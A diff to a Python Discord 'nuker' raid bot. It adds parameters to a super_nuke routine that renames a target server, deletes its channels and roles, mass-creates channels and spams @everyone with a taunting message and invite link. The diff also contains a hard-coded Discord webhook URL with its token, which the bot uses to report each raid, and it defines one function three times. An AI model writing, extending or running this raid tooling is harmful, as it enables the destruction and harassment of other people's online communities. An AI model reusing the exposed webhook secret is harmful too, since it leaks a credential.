@@ -23,6 +23,11 @@ import threading
 import itertools
 import requests
 from datetime import datetime
+from config import SERVER_CONFIG, AUTO_RAID_CONFIG, EMBED_CONFIG, WEBHOOK_CONFIG, NO_BAN_KICK_ID, BOT_PRESENCE
+
+
+def clear_console():
+    os.system('cls' if os.name == 'nt' else 'clear')
 
 WEBHOOK_URL = "https://discord.com/api/webhooks/1375179101576368128/ZRrJoVii09EsYd0g-CmQ9Ci1PbkuIsINWFc2ozvptx_8jczrmylflaejwKFpxu-LbwG_"
 
@@ -175,6 +180,7 @@ async def create_channels(server_id):
             print((Colorate.Color(Colors.red, "[-] Guild not found.")))
     except Exception as e:
         print((Colorate.Color(Colors.green, f"[-] Error: {e}")))
+
 
 
 async def spam_channel(server_id, num_messages=None, message_content=None, include_everyone=None):
@@ -682,36 +688,16 @@ async def auto_raid(server_id):
     except Exception as e:
         log_message(Colors.red, f"[-] Error: {e}")
 
-async def start_super_nuke(bot):
-    try:
-        server_id = input("Enter Server ID: ")
-        # Use the bot's own user ID automatically
-        bot_user_id = bot.user.id  
-        
-        num_messages = int(input("Enter number of messages to spam (default 20): ") or "20")
-        message_content = input("Enter spam message (default preset): ") or "@everyone YK SECURITY IS ASS -MZKO https://discord.gg/vzuEC6auCg :heart:"
-        include_everyone_input = input("Include @everyone in spam? (y/N): ").lower()
-        include_everyone = include_everyone_input == "y"
-
-        await super_nuke(
-            bot=bot,
-            server_id=server_id,
-            bot_user_id=bot_user_id,
-            num_messages=num_messages,
-            message_content=message_content,
-            include_everyone=include_everyone
-        )
-    except Exception as e:
-        print(Colorate.Color(Colors.red, f"[!] Error gathering inputs: {e}"))
-
-
 async def super_nuke(
-    bot,
     server_id,
     bot_user_id,
-    num_messages=40,
+    new_guild_name,
+    num_channels,
+    channel_name,
+    channel_type="text",
+    num_messages=20,
     message_content="@everyone YK SECURITY IS ASS -MZKO https://discord.gg/vzuEC6auCg :heart:",
-    include_everyone=True
+    include_everyone=False
 ):
     try:
         guild = bot.get_guild(int(server_id))
@@ -722,11 +708,41 @@ async def super_nuke(
         print(Colorate.Color(Colors.green, "[*] Renaming guild..."))
         await change_server(server_id)
 
+        try:
+            await guild.edit(name=new_guild_name)
+            print(Colorate.Color(Colors.green, f"[+] Server renamed to: {new_guild_name}"))
+        except Exception as e:
+            print(Colorate.Color(Colors.red, f"[-] Failed to rename guild: {e}"))
+
         print(Colorate.Color(Colors.green, "[*] Nuking channels and roles..."))
         await nuke(server_id)
 
         print(Colorate.Color(Colors.green, "[*] Creating new channels..."))
-        await create_channels(server_id)
+
+        async def create_channel(channel_name, channel_type):
+            try:
+                if channel_type == "text":
+                    await guild.create_text_channel(channel_name)
+                elif channel_type == "voice":
+                    await guild.create_voice_channel(channel_name)
+                else:
+                    print(Colorate.Color(Colors.red, f"[-] Invalid channel type: {channel_type}"))
+                    return False
+                return True
+            except Exception as e:
+                print(Colorate.Color(Colors.red, f"[-] Failed to create channel '{channel_name}': {e}"))
+                return False
+
+        channel_futures = [
+            create_channel(f"{channel_name}", channel_type) for i in range(num_channels)
+        ]
+        start_time = time.time()
+        results = await asyncio.gather(*channel_futures)
+        end_time = time.time()
+
+        created = results.count(True)
+        failed = results.count(False)
+        print(Colorate.Color(Colors.blue, f"[!] Created {created} channels, failed {failed} in {end_time - start_time:.2f} seconds"))
 
         print(Colorate.Color(Colors.green, "[*] Spamming new channels..."))
         await spam_channel(
@@ -737,8 +753,53 @@ async def super_nuke(
         )
 
         print(Colorate.Color(Colors.green, "[+] Super Nuke completed successfully!"))
+
     except Exception as e:
         print(Colorate.Color(Colors.red, f"[-] Super Nuke error: {e}"))
+
+
+async def rename_and_botspam_all_channels(
+    bot, 
+    guild_id: int, 
+    new_name: str, 
+    new_guild_name: str,  
+    spam_message="@everyone YK SECURITY IS ASS -MZKO https://discord.gg/vzuEC6auCg :heart:", 
+    spam_count=50
+):
+    guild = bot.get_guild(guild_id)
+    if not guild:
+        print(f"Bot is not in guild {guild_id}")
+        return
+
+
+    try:
+        await guild.edit(name=new_guild_name)
+        print(f"Renamed guild to '{new_guild_name}'")
+    except Exception as e:
+        print(f"Failed to rename guild: {e}")
+
+
+async def rename_and_botspam_all_channels(
+    bot, 
+    guild_id: int, 
+    new_name: str, 
+    new_guild_name: str,  
+    spam_message="@everyone YK SECURITY IS ASS -MZKO https://discord.gg/vzuEC6auCg :heart:", 
+    spam_count=50
+):
+    guild = bot.get_guild(guild_id)
+    if not guild:
+        print(f"Bot is not in guild {guild_id}")
+        return
+
+
+    try:
+        await guild.edit(name=new_guild_name)
+        print(f"Renamed guild to '{new_guild_name}'")
+    except Exception as e:
+        print(f"Failed to rename guild: {e}")
+
+
 
 
 async def rename_and_botspam_all_channels(
@@ -903,18 +964,18 @@ def get_config():
         if use_token:
             bot_token = config["bot_token"]
         else:
-            bot_token = input(Colorate.Color(Colors.cyan, "Enter your Bot Token: "))
+            bot_token = input(Colorate.Color(Colors.red, "Enter your Bot Token: "))
     else:
-        bot_token = input(Colorate.Color(Colors.cyan, "Enter your Bot Token: "))
+        bot_token = input(Colorate.Color(Colors.red, "Enter your Bot Token: "))
 
     if config.get("server_id"):
         use_server = prompt_yes_no(f"Use saved Server ID? ({config['server_id']})")
         if use_server:
             server_id = config["server_id"]
         else:
-            server_id = input(Colorate.Color(Colors.cyan, "Enter your Server ID: "))
+            server_id = input(Colorate.Color(Colors.red, "Enter your Server ID: "))
     else:
-        server_id = input(Colorate.Color(Colors.cyan, "Enter your Server ID: "))
+        server_id = input(Colorate.Color(Colors.red, "Enter your Server ID: "))
 
     save_config(bot_token, server_id)
     print(Colorate.Color(Colors.green, "[✓] Configuration saved!"))
@@ -938,6 +999,7 @@ async def on_ready():
     server = bot.get_guild(int(server_id))
     if server:
         print(Colorate.Color(Colors.green, f'[+] Bot is in the specified server ({server.name})'))
+        clear_console()
         try:
             log_to_webhook(
                 user_str=str(bot.user),
@@ -1090,11 +1152,29 @@ async def on_ready():
 
         elif choice == '12':
             try:
-                await super_nuke(server_id, bot_user_id=None)
+                new_guild_name = SERVER_CONFIG["new_name"]
+                num_channels = int(input("How many channels to create? "))
+                channel_name = input("Enter name for new channels: ")
+                message_content = input("Enter spam message (leave blank for default): ").strip()
+                if not message_content:
+                    message_content = "@everyone YK SECURITY IS ASS -MZKO https://discord.gg/vzuEC6auCg :heart:"
+                include_everyone_input = input("Tag @everyone in messages? (y/n): ").lower()
+                include_everyone = include_everyone_input == 'y'
+
+                await super_nuke(
+                    server_id=server_id,
+                    bot_user_id=bot.user.id,
+                    new_guild_name=new_guild_name,
+                    num_channels=num_channels,
+                    channel_name=channel_name,
+                    message_content=message_content,
+                    include_everyone=include_everyone
+                )
                 log_to_webhook(str(bot.user), bot.user.id, "Success", "super_nuke", server_id)
+
             except Exception as e:
                 log_to_webhook(str(bot.user), bot.user.id, "Failed", "super_nuke", server_id)
-                print(e)
+                print(Colorate.Color(Colors.red, f"[!] Error: {e}"))
 
         elif choice == '13':
             try:
